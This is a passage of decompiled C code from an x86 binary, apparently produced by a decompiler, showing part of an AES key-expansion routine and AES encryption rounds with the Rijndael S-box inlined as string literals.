        v17 = *(char *)(v7 + (int32_t)"c|w{\xf2ko\xc5\x30\x01g+\xfe\xd7\xabv\xca\x82\xc9}\xfaYG\xf0\xad\xd4\xa2\xaf\x9c\xa4r\xc0\xb7\xfd\x93&6?\xf7\xcc\x34\xa5\xe5\xf1q\xd8\x31\x15\x04\xc7#\xc3\x18\x96\x05\x9a\a\x12\x80\xe2\xeb'\xb2u\t\x83,\x1a\x1bnZ\xa0R;\xd6\xb3)\xe3/\x84S\xd1\x00\xed \xfc\xb1[j\xcb\xbe\x39JLX\xcf\xd0\xef\xaa\xfb\x43M3\x85\x45\xf9\x02\x7fP<\x9f\xa8Q\xa3@\x8f\x92\x9d\x38\xf5\xbc\xb6\xda!\x10\xff\xf3\xd2\xcd\f\x13\xec_\x97\x44\x17\xc4\xa7~=d]\x19s`\x81O\xdc\"*\x90\x88\x46\xee\xb8\x14\xde^\v\xdb\xe0\x32:\nI\x06$\\\xc2\xd3\xac\x62\x91\x95\xe4y\xe7\xc8\x37m\x8d\xd5N\xa9lV\xf4\xea\x65z\xae\b\xbax%.\x1c\xa6\xb4\xc6\xe8\xddt\x1fK\xbd\x8b\x8ap>\xb5\x66H\x03\xf6\x0e\x61\x35W\xb9\x86\xc1\x1d\x9e\xe1\xf8\x98\x11i\xd9\x8e\x94\x9b\x1e\x87\xe9\xceU(\xdf\x8c\xa1\x89\r\xbf\xe6\x42hA\x99-\x0f\xb0T\xbb\x16");
        v18 = *(char *)(v10 + (int32_t)"c|w{\xf2ko\xc5\x30\x01g+\xfe\xd7\xabv\xca\x82\xc9}\xfaYG\xf0\xad\xd4\xa2\xaf\x9c\xa4r\xc0\xb7\xfd\x93&6?\xf7\xcc\x34\xa5\xe5\xf1q\xd8\x31\x15\x04\xc7#\xc3\x18\x96\x05\x9a\a\x12\x80\xe2\xeb'\xb2u\t\x83,\x1a\x1bnZ\xa0R;\xd6\xb3)\xe3/\x84S\xd1\x00\xed \xfc\xb1[j\xcb\xbe\x39JLX\xcf\xd0\xef\xaa\xfb\x43M3\x85\x45\xf9\x02\x7fP<\x9f\xa8Q\xa3@\x8f\x92\x9d\x38\xf5\xbc\xb6\xda!\x10\xff\xf3\xd2\xcd\f\x13\xec_\x97\x44\x17\xc4\xa7~=d]\x19s`\x81O\xdc\"*\x90\x88\x46\xee\xb8\x14\xde^\v\xdb\xe0\x32:\nI\x06$\\\xc2\xd3\xac\x62\x91\x95\xe4y\xe7\xc8\x37m\x8d\xd5N\xa9lV\xf4\xea\x65z\xae\b\xbax%.\x1c\xa6\xb4\xc6\xe8\xddt\x1fK\xbd\x8b\x8ap>\xb5\x66H\x03\xf6\x0e\x61\x35W\xb9\x86\xc1\x1d\x9e\xe1\xf8\x98\x11i\xd9\x8e\x94\x9b\x1e\x87\xe9\xceU(\xdf\x8c\xa1\x89\r\xbf\xe6\x42hA\x99-\x0f\xb0T\xbb\x16");
        v19 = *(char *)(v5 / 8 + (int32_t)&g71);
        v20 = *(char *)(v11 + (int32_t)"c|w{\xf2ko\xc5\x30\x01g+\xfe\xd7\xabv\xca\x82\xc9}\xfaYG\xf0\xad\xd4\xa2\xaf\x9c\xa4r\xc0\xb7\xfd\x93&6?\xf7\xcc\x34\xa5\xe5\xf1q\xd8\x31\x15\x04\xc7#\xc3\x18\x96\x05\x9a\a\x12\x80\xe2\xeb'\xb2u\t\x83,\x1a\x1bnZ\xa0R;\xd6\xb3)\xe3/\x84S\xd1\x00\xed \xfc\xb1[j\xcb\xbe\x39JLX\xcf\xd0\xef\xaa\xfb\x43M3\x85\x45\xf9\x02\x7fP<\x9f\xa8Q\xa3@\x8f\x92\x9d\x38\xf5\xbc\xb6\xda!\x10\xff\xf3\xd2\xcd\f\x13\xec_\x97\x44\x17\xc4\xa7~=d]\x19s`\x81O\xdc\"*\x90\x88\x46\xee\xb8\x14\xde^\v\xdb\xe0\x32:\nI\x06$\\\xc2\xd3\xac\x62\x91\x95\xe4y\xe7\xc8\x37m\x8d\xd5N\xa9lV\xf4\xea\x65z\xae\b\xbax%.\x1c\xa6\xb4\xc6\xe8\xddt\x1fK\xbd\x8b\x8ap>\xb5\x66H\x03\xf6\x0e\x61\x35W\xb9\x86\xc1\x1d\x9e\xe1\xf8\x98\x11i\xd9\x8e\x94\x9b\x1e\x87\xe9\xceU(\xdf\x8c\xa1\x89\r\xbf\xe6\x42hA\x99-\x0f\xb0T\xbb\x16");
        v21 = 256 * (int32_t)v18 | v11;
        v1 = v21;
        v13 = v21;
        v15 = v17;
        v14 = 256 * (int32_t)v16 | (int32_t)(v20 ^ v19);
    }
    int32_t v28 = v5 + 1; // 0x401186
    v1 = v13 & -256 | (int32_t)v15;
    *(char *)(v3 + 3) = *(char *)(v3 - 29) ^ (char)v14;
    int32_t result = v3 + 4; // 0x401195
    *(char *)result = *(char *)(v3 - 28) ^ (char)(v14 / 256);
    *(char *)(v3 + 5) = *(char *)(v3 - 27) ^ v15;
    char v29 = *(char *)(v3 - 26) ^ (char)(v13 / 256); // 0x4011a5
    *(char *)(v3 + 6) = v29;
    while (v28 != 60) {
        // 0x401100
        v5 = v28;
        int32_t v30 = result;
        v6 = *(char *)(v30 + 1);
        v7 = v29;
        v8 = v1;
        v9 = v8 & -0xff01 | 256 * v7;
        v1 = v9;
        v10 = (int32_t)*(char *)(v30 - 1);
        v11 = (int32_t)*(char *)v30;
        v12 = v5 & 7;
        if (v12 != 0) {
            // 0x401153
            v13 = v9;
            v15 = v6;
            v14 = 256 * v11 | v10;
            if (v12 == 4) {
                // 0x401158
                v22 = v6;
                v23 = *(char *)(v10 + (int32_t)"c|w{\xf2ko\xc5\x30\x01g+\xfe\xd7\xabv\xca\x82\xc9}\xfaYG\xf0\xad\xd4\xa2\xaf\x9c\xa4r\xc0\xb7\xfd\x93&6?\xf7\xcc\x34\xa5\xe5\xf1q\xd8\x31\x15\x04\xc7#\xc3\x18\x96\x05\x9a\a\x12\x80\xe2\xeb'\xb2u\t\x83,\x1a\x1bnZ\xa0R;\xd6\xb3)\xe3/\x84S\xd1\x00\xed \xfc\xb1[j\xcb\xbe\x39JLX\xcf\xd0\xef\xaa\xfb\x43M3\x85\x45\xf9\x02\x7fP<\x9f\xa8Q\xa3@\x8f\x92\x9d\x38\xf5\xbc\xb6\xda!\x10\xff\xf3\xd2\xcd\f\x13\xec_\x97\x44\x17\xc4\xa7~=d]\x19s`\x81O\xdc\"*\x90\x88\x46\xee\xb8\x14\xde^\v\xdb\xe0\x32:\nI\x06$\\\xc2\xd3\xac\x62\x91\x95\xe4y\xe7\xc8\x37m\x8d\xd5N\xa9lV\xf4\xea\x65z\xae\b\xbax%.\x1c\xa6\xb4\xc6\xe8\xddt\x1fK\xbd\x8b\x8ap>\xb5\x66H\x03\xf6\x0e\x61\x35W\xb9\x86\xc1\x1d\x9e\xe1\xf8\x98\x11i\xd9\x8e\x94\x9b\x1e\x87\xe9\xceU(\xdf\x8c\xa1\x89\r\xbf\xe6\x42hA\x99-\x0f\xb0T\xbb\x16");
                v24 = *(char *)(v11 + (int32_t)"c|w{\xf2ko\xc5\x30\x01g+\xfe\xd7\xabv\xca\x82\xc9}\xfaYG\xf0\xad\xd4\xa2\xaf\x9c\xa4r\xc0\xb7\xfd\x93&6?\xf7\xcc\x34\xa5\xe5\xf1q\xd8\x31\x15\x04\xc7#\xc3\x18\x96\x05\x9a\a\x12\x80\xe2\xeb'\xb2u\t\x83,\x1a\x1bnZ\xa0R;\xd6\xb3)\xe3/\x84S\xd1\x00\xed \xfc\xb1[j\xcb\xbe\x39JLX\xcf\xd0\xef\xaa\xfb\x43M3\x85\x45\xf9\x02\x7fP<\x9f\xa8Q\xa3@\x8f\x92\x9d\x38\xf5\xbc\xb6\xda!\x10\xff\xf3\xd2\xcd\f\x13\xec_\x97\x44\x17\xc4\xa7~=d]\x19s`\x81O\xdc\"*\x90\x88\x46\xee\xb8\x14\xde^\v\xdb\xe0\x32:\nI\x06$\\\xc2\xd3\xac\x62\x91\x95\xe4y\xe7\xc8\x37m\x8d\xd5N\xa9lV\xf4\xea\x65z\xae\b\xbax%.\x1c\xa6\xb4\xc6\xe8\xddt\x1fK\xbd\x8b\x8ap>\xb5\x66H\x03\xf6\x0e\x61\x35W\xb9\x86\xc1\x1d\x9e\xe1\xf8\x98\x11i\xd9\x8e\x94\x9b\x1e\x87\xe9\xceU(\xdf\x8c\xa1\x89\r\xbf\xe6\x42hA\x99-\x0f\xb0T\xbb\x16");
                v25 = *(char *)(v22 + (int32_t)"c|w{\xf2ko\xc5\x30\x01g+\xfe\xd7\xabv\xca\x82\xc9}\xfaYG\xf0\xad\xd4\xa2\xaf\x9c\xa4r\xc0\xb7\xfd\x93&6?\xf7\xcc\x34\xa5\xe5\xf1q\xd8\x31\x15\x04\xc7#\xc3\x18\x96\x05\x9a\a\x12\x80\xe2\xeb'\xb2u\t\x83,\x1a\x1bnZ\xa0R;\xd6\xb3)\xe3/\x84S\xd1\x00\xed \xfc\xb1[j\xcb\xbe\x39JLX\xcf\xd0\xef\xaa\xfb\x43M3\x85\x45\xf9\x02\x7fP<\x9f\xa8Q\xa3@\x8f\x92\x9d\x38\xf5\xbc\xb6\xda!\x10\xff\xf3\xd2\xcd\f\x13\xec_\x97\x44\x17\xc4\xa7~=d]\x19s`\x81O\xdc\"*\x90\x88\x46\xee\xb8\x14\xde^\v\xdb\xe0\x32:\nI\x06$\\\xc2\xd3\xac\x62\x91\x95\xe4y\xe7\xc8\x37m\x8d\xd5N\xa9lV\xf4\xea\x65z\xae\b\xbax%.\x1c\xa6\xb4\xc6\xe8\xddt\x1fK\xbd\x8b\x8ap>\xb5\x66H\x03\xf6\x0e\x61\x35W\xb9\x86\xc1\x1d\x9e\xe1\xf8\x98\x11i\xd9\x8e\x94\x9b\x1e\x87\xe9\xceU(\xdf\x8c\xa1\x89\r\xbf\xe6\x42hA\x99-\x0f\xb0T\xbb\x16");
                v26 = *(char *)(v7 + (int32_t)"c|w{\xf2ko\xc5\x30\x01g+\xfe\xd7\xabv\xca\x82\xc9}\xfaYG\xf0\xad\xd4\xa2\xaf\x9c\xa4r\xc0\xb7\xfd\x93&6?\xf7\xcc\x34\xa5\xe5\xf1q\xd8\x31\x15\x04\xc7#\xc3\x18\x96\x05\x9a\a\x12\x80\xe2\xeb'\xb2u\t\x83,\x1a\x1bnZ\xa0R;\xd6\xb3)\xe3/\x84S\xd1\x00\xed \xfc\xb1[j\xcb\xbe\x39JLX\xcf\xd0\xef\xaa\xfb\x43M3\x85\x45\xf9\x02\x7fP<\x9f\xa8Q\xa3@\x8f\x92\x9d\x38\xf5\xbc\xb6\xda!\x10\xff\xf3\xd2\xcd\f\x13\xec_\x97\x44\x17\xc4\xa7~=d]\x19s`\x81O\xdc\"*\x90\x88\x46\xee\xb8\x14\xde^\v\xdb\xe0\x32:\nI\x06$\\\xc2\xd3\xac\x62\x91\x95\xe4y\xe7\xc8\x37m\x8d\xd5N\xa9lV\xf4\xea\x65z\xae\b\xbax%.\x1c\xa6\xb4\xc6\xe8\xddt\x1fK\xbd\x8b\x8ap>\xb5\x66H\x03\xf6\x0e\x61\x35W\xb9\x86\xc1\x1d\x9e\xe1\xf8\x98\x11i\xd9\x8e\x94\x9b\x1e\x87\xe9\xceU(\xdf\x8c\xa1\x89\r\xbf\xe6\x42hA\x99-\x0f\xb0T\xbb\x16");
                v27 = v8 & -0x10000 | v22 | 256 * (int32_t)v26;
                v1 = v27;
                v13 = v27;
                v15 = v25;
                v14 = 256 * (int32_t)v24 | (int32_t)v23;
            }
        } else {
            // 0x401118
            v16 = *(char *)((int32_t)v6 + (int32_t)"c|w{\xf2ko\xc5\x30\x01g+\xfe\xd7\xabv\xca\x82\xc9}\xfaYG\xf0\xad\xd4\xa2\xaf\x9c\xa4r\xc0\xb7\xfd\x93&6?\xf7\xcc\x34\xa5\xe5\xf1q\xd8\x31\x15\x04\xc7#\xc3\x18\x96\x05\x9a\a\x12\x80\xe2\xeb'\xb2u\t\x83,\x1a\x1bnZ\xa0R;\xd6\xb3)\xe3/\x84S\xd1\x00\xed \xfc\xb1[j\xcb\xbe\x39JLX\xcf\xd0\xef\xaa\xfb\x43M3\x85\x45\xf9\x02\x7fP<\x9f\xa8Q\xa3@\x8f\x92\x9d\x38\xf5\xbc\xb6\xda!\x10\xff\xf3\xd2\xcd\f\x13\xec_\x97\x44\x17\xc4\xa7~=d]\x19s`\x81O\xdc\"*\x90\x88\x46\xee\xb8\x14\xde^\v\xdb\xe0\x32:\nI\x06$\\\xc2\xd3\xac\x62\x91\x95\xe4y\xe7\xc8\x37m\x8d\xd5N\xa9lV\xf4\xea\x65z\xae\b\xbax%.\x1c\xa6\xb4\xc6\xe8\xddt\x1fK\xbd\x8b\x8ap>\xb5\x66H\x03\xf6\x0e\x61\x35W\xb9\x86\xc1\x1d\x9e\xe1\xf8\x98\x11i\xd9\x8e\x94\x9b\x1e\x87\xe9\xceU(\xdf\x8c\xa1\x89\r\xbf\xe6\x42hA\x99-\x0f\xb0T\xbb\x16");
            v17 = *(char *)(v7 + (int32_t)"c|w{\xf2ko\xc5\x30\x01g+\xfe\xd7\xabv\xca\x82\xc9}\xfaYG\xf0\xad\xd4\xa2\xaf\x9c\xa4r\xc0\xb7\xfd\x93&6?\xf7\xcc\x34\xa5\xe5\xf1q\xd8\x31\x15\x04\xc7#\xc3\x18\x96\x05\x9a\a\x12\x80\xe2\xeb'\xb2u\t\x83,\x1a\x1bnZ\xa0R;\xd6\xb3)\xe3/\x84S\xd1\x00\xed \xfc\xb1[j\xcb\xbe\x39JLX\xcf\xd0\xef\xaa\xfb\x43M3\x85\x45\xf9\x02\x7fP<\x9f\xa8Q\xa3@\x8f\x92\x9d\x38\xf5\xbc\xb6\xda!\x10\xff\xf3\xd2\xcd\f\x13\xec_\x97\x44\x17\xc4\xa7~=d]\x19s`\x81O\xdc\"*\x90\x88\x46\xee\xb8\x14\xde^\v\xdb\xe0\x32:\nI\x06$\\\xc2\xd3\xac\x62\x91\x95\xe4y\xe7\xc8\x37m\x8d\xd5N\xa9lV\xf4\xea\x65z\xae\b\xbax%.\x1c\xa6\xb4\xc6\xe8\xddt\x1fK\xbd\x8b\x8ap>\xb5\x66H\x03\xf6\x0e\x61\x35W\xb9\x86\xc1\x1d\x9e\xe1\xf8\x98\x11i\xd9\x8e\x94\x9b\x1e\x87\xe9\xceU(\xdf\x8c\xa1\x89\r\xbf\xe6\x42hA\x99-\x0f\xb0T\xbb\x16");
            v18 = *(char *)(v10 + (int32_t)"c|w{\xf2ko\xc5\x30\x01g+\xfe\xd7\xabv\xca\x82\xc9}\xfaYG\xf0\xad\xd4\xa2\xaf\x9c\xa4r\xc0\xb7\xfd\x93&6?\xf7\xcc\x34\xa5\xe5\xf1q\xd8\x31\x15\x04\xc7#\xc3\x18\x96\x05\x9a\a\x12\x80\xe2\xeb'\xb2u\t\x83,\x1a\x1bnZ\xa0R;\xd6\xb3)\xe3/\x84S\xd1\x00\xed \xfc\xb1[j\xcb\xbe\x39JLX\xcf\xd0\xef\xaa\xfb\x43M3\x85\x45\xf9\x02\x7fP<\x9f\xa8Q\xa3@\x8f\x92\x9d\x38\xf5\xbc\xb6\xda!\x10\xff\xf3\xd2\xcd\f\x13\xec_\x97\x44\x17\xc4\xa7~=d]\x19s`\x81O\xdc\"*\x90\x88\x46\xee\xb8\x14\xde^\v\xdb\xe0\x32:\nI\x06$\\\xc2\xd3\xac\x62\x91\x95\xe4y\xe7\xc8\x37m\x8d\xd5N\xa9lV\xf4\xea\x65z\xae\b\xbax%.\x1c\xa6\xb4\xc6\xe8\xddt\x1fK\xbd\x8b\x8ap>\xb5\x66H\x03\xf6\x0e\x61\x35W\xb9\x86\xc1\x1d\x9e\xe1\xf8\x98\x11i\xd9\x8e\x94\x9b\x1e\x87\xe9\xceU(\xdf\x8c\xa1\x89\r\xbf\xe6\x42hA\x99-\x0f\xb0T\xbb\x16");
            v19 = *(char *)(v5 / 8 + (int32_t)&g71);
            v20 = *(char *)(v11 + (int32_t)"c|w{\xf2ko\xc5\x30\x01g+\xfe\xd7\xabv\xca\x82\xc9}\xfaYG\xf0\xad\xd4\xa2\xaf\x9c\xa4r\xc0\xb7\xfd\x93&6?\xf7\xcc\x34\xa5\xe5\xf1q\xd8\x31\x15\x04\xc7#\xc3\x18\x96\x05\x9a\a\x12\x80\xe2\xeb'\xb2u\t\x83,\x1a\x1bnZ\xa0R;\xd6\xb3)\xe3/\x84S\xd1\x00\xed \xfc\xb1[j\xcb\xbe\x39JLX\xcf\xd0\xef\xaa\xfb\x43M3\x85\x45\xf9\x02\x7fP<\x9f\xa8Q\xa3@\x8f\x92\x9d\x38\xf5\xbc\xb6\xda!\x10\xff\xf3\xd2\xcd\f\x13\xec_\x97\x44\x17\xc4\xa7~=d]\x19s`\x81O\xdc\"*\x90\x88\x46\xee\xb8\x14\xde^\v\xdb\xe0\x32:\nI\x06$\\\xc2\xd3\xac\x62\x91\x95\xe4y\xe7\xc8\x37m\x8d\xd5N\xa9lV\xf4\xea\x65z\xae\b\xbax%.\x1c\xa6\xb4\xc6\xe8\xddt\x1fK\xbd\x8b\x8ap>\xb5\x66H\x03\xf6\x0e\x61\x35W\xb9\x86\xc1\x1d\x9e\xe1\xf8\x98\x11i\xd9\x8e\x94\x9b\x1e\x87\xe9\xceU(\xdf\x8c\xa1\x89\r\xbf\xe6\x42hA\x99-\x0f\xb0T\xbb\x16");
            v21 = 256 * (int32_t)v18 | v11;
            v1 = v21;
            v13 = v21;
            v15 = v17;
            v14 = 256 * (int32_t)v16 | (int32_t)(v20 ^ v19);
        }
        char v31 = *(char *)(v30 - 29); // 0x401182
        v28 = v5 + 1;
        v1 = v13 & -256 | (int32_t)v15;
        *(char *)(v30 + 3) = v31 ^ (char)v14;
        char v32 = *(char *)(v30 - 28); // 0x40118f
        result = v30 + 4;
        *(char *)result = v32 ^ (char)(v14 / 256);
        char v33 = *(char *)(v30 - 27); // 0x401198
        *(char *)(v30 + 5) = v33 ^ v15;
        v29 = *(char *)(v30 - 26) ^ (char)(v13 / 256);
        *(char *)(v30 + 6) = v29;
    }
    // 0x4011b6
    return result;
}

// Address range: 0x4011c0 - 0x401407
// Used cryptographic patterns:
//  - AES_Rijndael_S___ARIA_S1 (8-bit, little endian)
int32_t function_4011c0(void) {
    int32_t v1 = 4; // 0x4011dc
    int32_t v2 = 4; // 0x4011e0
    int32_t v3; // 0x4011c0
    char * v4 = (char *)v3; // 0x4011e8
    int32_t v5; // 0x4011c0
    int32_t v6; // 0x4011c0
    *v4 = *v4 ^ *(char *)(v5 - v6 + v3);
    int32_t v7 = v3 + 1; // 0x4011ea
    v2--;
    int32_t v8 = v7; // 0x4011ee
    while (v2 != 0) {
        // 0x4011e5
        v4 = (char *)v8;
        *v4 = *v4 ^ *(char *)(v5 - v6 + v8);
        v7 = v8 + 1;
        v2--;
        v8 = v7;
    }
    // 0x4011f0
    v1--;
    while (v1 != 0) {
        // 0x4011e0
        v2 = 4;
        v4 = (char *)v7;
        *v4 = *v4 ^ *(char *)(v5 - v6 + v7);
        v7++;
        v2--;
        v8 = v7;
        while (v2 != 0) {
            // 0x4011e5
            v4 = (char *)v8;
            *v4 = *v4 ^ *(char *)(v5 - v6 + v8);
            v7 = v8 + 1;
            v2--;
            v8 = v7;
        }
        // 0x4011f0
        v1--;
    }
    char * v9 = (char *)(v6 + 5);
    char * v10 = (char *)(v6 + 1);
    char * v11 = (char *)(v6 + 9);
    char * v12 = (char *)(v6 + 13);
    char * v13 = (char *)(v6 + 10);
    int32_t v14 = v6 + 2; // 0x40125d
    char * v15 = (char *)v14;
    char * v16 = (char *)(v6 + 14);
    char * v17 = (char *)(v6 + 6);
    char * v18 = (char *)(v6 + 15);
    char * v19 = (char *)(v6 + 3);
    char * v20 = (char *)(v6 + 11);
    char * v21 = (char *)(v6 + 7);
    int32_t v22 = 13; // 0x401202
    while (true) {
      lab_0x401205:;
        int32_t v23 = 4; // 0x40120e
        int32_t v24; // 0x4011c0
        int32_t v25 = v24; // 0x401217
        int32_t v26 = 4; // 0x401217
        char * v27 = (char *)v25; // 0x401220
        unsigned char v28 = *v27; // 0x401220
        char v29 = *(char *)((int32_t)v28 + (int32_t)"c|w{\xf2ko\xc5\x30\x01g+\xfe\xd7\xabv\xca\x82\xc9}\xfaYG\xf0\xad\xd4\xa2\xaf\x9c\xa4r\xc0\xb7\xfd\x93&6?\xf7\xcc\x34\xa5\xe5\xf1q\xd8\x31\x15\x04\xc7#\xc3\x18\x96\x05\x9a\a\x12\x80\xe2\xeb'\xb2u\t\x83,\x1a\x1bnZ\xa0R;\xd6\xb3)\xe3/\x84S\xd1\x00\xed \xfc\xb1[j\xcb\xbe\x39JLX\xcf\xd0\xef\xaa\xfb\x43M3\x85\x45\xf9\x02\x7fP<\x9f\xa8Q\xa3@\x8f\x92\x9d\x38\xf5\xbc\xb6\xda!\x10\xff\xf3\xd2\xcd\f\x13\xec_\x97\x44\x17\xc4\xa7~=d]\x19s`\x81O\xdc\"*\x90\x88\x46\xee\xb8\x14\xde^\v\xdb\xe0\x32:\nI\x06$\\\xc2\xd3\xac\x62\x91\x95\xe4y\xe7\xc8\x37m\x8d\xd5N\xa9lV\xf4\xea\x65z\xae\b\xbax%.\x1c\xa6\xb4\xc6\xe8\xddt\x1fK\xbd\x8b\x8ap>\xb5\x66H\x03\xf6\x0e\x61\x35W\xb9\x86\xc1\x1d\x9e\xe1\xf8\x98\x11i\xd9\x8e\x94\x9b\x1e\x87\xe9\xceU(\xdf\x8c\xa1\x89\r\xbf\xe6\x42hA\x99-\x0f\xb0T\xbb\x16"); // 0x401226
        *v27 = v29;
        v26--;
        v25 += 4;
        while (v26 != 0) {
            // 0x401220
            v27 = (char *)v25;
            v28 = *v27;
            v29 = *(char *)((int32_t)v28 + (int32_t)"c|w{\xf2ko\xc5\x30\x01g+\xfe\xd7\xabv\xca\x82\xc9}\xfaYG\xf0\xad\xd4\xa2\xaf\x9c\xa4r\xc0\xb7\xfd\x93&6?\xf7\xcc\x34\xa5\xe5\xf1q\xd8\x31\x15\x04\xc7#\xc3\x18\x96\x05\x9a\a\x12\x80\xe2\xeb'\xb2u\t\x83,\x1a\x1bnZ\xa0R;\xd6\xb3)\xe3/\x84S\xd1\x00\xed \xfc\xb1[j\xcb\xbe\x39JLX\xcf\xd0\xef\xaa\xfb\x43M3\x85\x45\xf9\x02\x7fP<\x9f\xa8Q\xa3@\x8f\x92\x9d\x38\xf5\xbc\xb6\xda!\x10\xff\xf3\xd2\xcd\f\x13\xec_\x97\x44\x17\xc4\xa7~=d]\x19s`\x81O\xdc\"*\x90\x88\x46\xee\xb8\x14\xde^\v\xdb\xe0\x32:\nI\x06$\\\xc2\xd3\xac\x62\x91\x95\xe4y\xe7\xc8\x37m\x8d\xd5N\xa9lV\xf4\xea\x65z\xae\b\xbax%.\x1c\xa6\xb4\xc6\xe8\xddt\x1fK\xbd\x8b\x8ap>\xb5\x66H\x03\xf6\x0e\x61\x35W\xb9\x86\xc1\x1d\x9e\xe1\xf8\x98\x11i\xd9\x8e\x94\x9b\x1e\x87\xe9\xceU(\xdf\x8c\xa1\x89\r\xbf\xe6\x42hA\x99-\x0f\xb0T\xbb\x16");
            *v27 = v29;
            v26--;
            v25 += 4;
        }
        // 0x401234
        v23--;
        v24++;
        while (v23 != 0) {
            // 0x401210
            v25 = v24;
            v26 = 4;
            v27 = (char *)v25;
            v28 = *v27;
            v29 = *(char *)((int32_t)v28 + (int32_t)"c|w{\xf2ko\xc5\x30\x01g+\xfe\xd7\xabv\xca\x82\xc9}\xfaYG\xf0\xad\xd4\xa2\xaf\x9c\xa4r\xc0\xb7\xfd\x93&6?\xf7\xcc\x34\xa5\xe5\xf1q\xd8\x31\x15\x04\xc7#\xc3\x18\x96\x05\x9a\a\x12\x80\xe2\xeb'\xb2u\t\x83,\x1a\x1bnZ\xa0R;\xd6\xb3)\xe3/\x84S\xd1\x00\xed \xfc\xb1[j\xcb\xbe\x39JLX\xcf\xd0\xef\xaa\xfb\x43M3\x85\x45\xf9\x02\x7fP<\x9f\xa8Q\xa3@\x8f\x92\x9d\x38\xf5\xbc\xb6\xda!\x10\xff\xf3\xd2\xcd\f\x13\xec_\x97\x44\x17\xc4\xa7~=d]\x19s`\x81O\xdc\"*\x90\x88\x46\xee\xb8\x14\xde^\v\xdb\xe0\x32:\nI\x06$\\\xc2\xd3\xac\x62\x91\x95\xe4y\xe7\xc8\x37m\x8d\xd5N\xa9lV\xf4\xea\x65z\xae\b\xbax%.\x1c\xa6\xb4\xc6\xe8\xddt\x1fK\xbd\x8b\x8ap>\xb5\x66H\x03\xf6\x0e\x61\x35W\xb9\x86\xc1\x1d\x9e\xe1\xf8\x98\x11i\xd9\x8e\x94\x9b\x1e\x87\xe9\xceU(\xdf\x8c\xa1\x89\r\xbf\xe6\x42hA\x99-\x0f\xb0T\xbb\x16");
            *v27 = v29;
            v26--;
            v25 += 4;
            while (v26 != 0) {
                // 0x401220
                v27 = (char *)v25;
                v28 = *v27;
                v29 = *(char *)((int32_t)v28 + (int32_t)"c|w{\xf2ko\xc5\x30\x01g+\xfe\xd7\xabv\xca\x82\xc9}\xfaYG\xf0\xad\xd4\xa2\xaf\x9c\xa4r\xc0\xb7\xfd\x93&6?\xf7\xcc\x34\xa5\xe5\xf1q\xd8\x31\x15\x04\xc7#\xc3\x18\x96\x05\x9a\a\x12\x80\xe2\xeb'\xb2u\t\x83,\x1a\x1bnZ\xa0R;\xd6\xb3)\xe3/\x84S\xd1\x00\xed \xfc\xb1[j\xcb\xbe\x39JLX\xcf\xd0\xef\xaa\xfb\x43M3\x85\x45\xf9\x02\x7fP<\x9f\xa8Q\xa3@\x8f\x92\x9d\x38\xf5\xbc\xb6\xda!\x10\xff\xf3\xd2\xcd\f\x13\xec_\x97\x44\x17\xc4\xa7~=d]\x19s`\x81O\xdc\"*\x90\x88\x46\xee\xb8\x14\xde^\v\xdb\xe0\x32:\nI\x06$\\\xc2\xd3\xac\x62\x91\x95\xe4y\xe7\xc8\x37m\x8d\xd5N\xa9lV\xf4\xea\x65z\xae\b\xbax%.\x1c\xa6\xb4\xc6\xe8\xddt\x1fK\xbd\x8b\x8ap>\xb5\x66H\x03\xf6\x0e\x61\x35W\xb9\x86\xc1\x1d\x9e\xe1\xf8\x98\x11i\xd9\x8e\x94\x9b\x1e\x87\xe9\xceU(\xdf\x8c\xa1\x89\r\xbf\xe6\x42hA\x99-\x0f\xb0T\xbb\x16");
                *v27 = v29;
                v26--;
                v25 += 4;
            }
            // 0x401234
            v23--;
            v24++;
        }
        // 0x40123b
        *v10 = *v9;
        *v9 = *v11;
        *v11 = *v12;
        *v12 = *v10;
        *v15 = *v13;
        *v13 = *v15;
        *v17 = *v16;
        *v16 = *v17;
        *v19 = *v18;
        *v18 = *v20;
        *v20 = *v21;
        *v21 = *v19;
        int32_t v30 = 4; // 0x40128e
        int32_t v31 = v14; // 0x40128e
        while (true) {
            char * v32 = (char *)(v31 + 1); // 0x401291
            char v33 = *v32; // 0x401291
            char * v34 = (char *)(v31 - 2); // 0x401297
            char v35 = *v34; // 0x401297
            char * v36 = (char *)v31; // 0x40129c
            char v37 = *v36; // 0x40129c
            char * v38 = (char *)(v31 - 1); // 0x4012a1
            char v39 = *v38; // 0x4012a1
            char v40 = v37 ^ v33; // 0x4012a4
            char v41 = v39 ^ v35; // 0x4012a9
            char v42 = v40 ^ v35; // 0x4012ad
            char v43 = v42 ^ v39; // 0x4012b9
            char v44 = v39 ^ v37; // 0x4012c5
            *v34 = 2 * v41 ^ v35 ^ v43 ^ v41 >> 7 & 27;
            char v45 = v35 ^ v33; // 0x4012e0
            *v38 = 2 * v44 ^ v42 ^ v44 >> 7 & 27;
            *v36 = 2 * v40 ^ v37 ^ v40 >> 7 & 27 ^ v43;
            *v32 = 2 * v45 ^ v33 ^ v45 >> 7 & 27 ^ v43;
            v30--;
            v31 += 4;
            if (v30 == 0) {
                goto lab_0x401335;
            }
        }
        goto lab_0x401348;
    }
  lab_0x401360:;
    int32_t v46; // 0x4011c0
    while (true) {
        // 0x401360
        int32_t v47; // 0x4011c0
        int32_t v48 = v47; // 0x401367
        int32_t v49 = 4; // 0x401367
        char * v50 = (char *)v48; // 0x401370
        unsigned char v51 = *v50; // 0x401370
        char v52 = *(char *)((int32_t)v51 + (int32_t)"c|w{\xf2ko\xc5\x30\x01g+\xfe\xd7\xabv\xca\x82\xc9}\xfaYG\xf0\xad\xd4\xa2\xaf\x9c\xa4r\xc0\xb7\xfd\x93&6?\xf7\xcc\x34\xa5\xe5\xf1q\xd8\x31\x15\x04\xc7#\xc3\x18\x96\x05\x9a\a\x12\x80\xe2\xeb'\xb2u\t\x83,\x1a\x1bnZ\xa0R;\xd6\xb3)\xe3/\x84S\xd1\x00\xed 